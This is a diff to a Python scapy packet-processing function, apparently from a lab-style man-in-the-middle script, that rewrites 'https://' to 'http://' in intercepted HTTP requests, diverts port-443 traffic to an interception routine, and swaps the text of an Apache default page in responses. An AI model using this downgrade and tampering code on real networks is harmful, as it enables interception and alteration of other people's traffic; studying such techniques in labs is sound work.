@@ -91,47 +91,37 @@ def process_packet(packet):
     # Convert packet to scapy packet
     scapy_packet = IP(packet.get_payload())
     
-    # check if the packet is a TCP packet and has a Raw layer
-    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
-        # if the packet is a request
-        if scapy_packet[TCP].dport == 80:
-            print("[+] TCP ...")
+    # Check if packet is a HTTP request
+    if scapy_packet.haslayer(TCP):
+        if scapy_packet[TCP].dport == 80 and scapy_packet.haslayer(Raw):
+            print("[+] HTTP Request...")
             load = scapy_packet[Raw].load.decode()
-
-            # whats in playload?
-            print("Before modification: \n")
-            print(load)
-
-            # if it is trying to access HTTPS, redirect to HTTP
-            if 'https://' in load:
-                print("[+] HTTPS ...")
-                intercept_packet(scapy_packet) # call intercept_packet function to handle HTTPS 
-
-            elif 'http://' in load:
-                print("[+] HTTP ...")
-  
-                # Don't do anything?
-
-                scapy_packet[Raw].load = load.encode()
-                del scapy_packet[IP].len
-                del scapy_packet[IP].chksum
-                del scapy_packet[TCP].chksum
-                packet.set_payload(bytes(scapy_packet))
-
-        # if the packet is a response
-        elif scapy_packet[TCP].sport == 80:
-            print("[+] HTTP Response...")
-            load = scapy_packet[Raw].load.decode()
-
-            # Modify the response as necessary
-            load = re.sub('<html><body><h1>It works!</h1></body></html>', \
-                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
-                
+            # Modify the request as necessary
+            load = re.sub('https://', 'http://', load)
             scapy_packet[Raw].load = load.encode()
             del scapy_packet[IP].len
             del scapy_packet[IP].chksum
             del scapy_packet[TCP].chksum
             packet.set_payload(bytes(scapy_packet))
+        elif scapy_packet[TCP].dport == 443:
+            print("[+] HTTPS Request...")
+            # If it is, call the intercept_packet function to handle it
+            intercept_packet(scapy_packet)
+
+    # if the packet is a response
+    if scapy_packet[TCP].sport == 80 and scapy_packet.haslayer(Raw):
+        print("[+] HTTP Response...")
+        load = scapy_packet[Raw].load.decode()
+
+        # Modify the response as necessary
+        load = re.sub('<html><body><h1>It works!</h1></body></html>', \
+                        '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
+            
+        scapy_packet[Raw].load = load.encode()
+        del scapy_packet[IP].len
+        del scapy_packet[IP].chksum
+        del scapy_packet[TCP].chksum
+        packet.set_payload(bytes(scapy_packet))
 
     # Accept packet
     packet.accept()
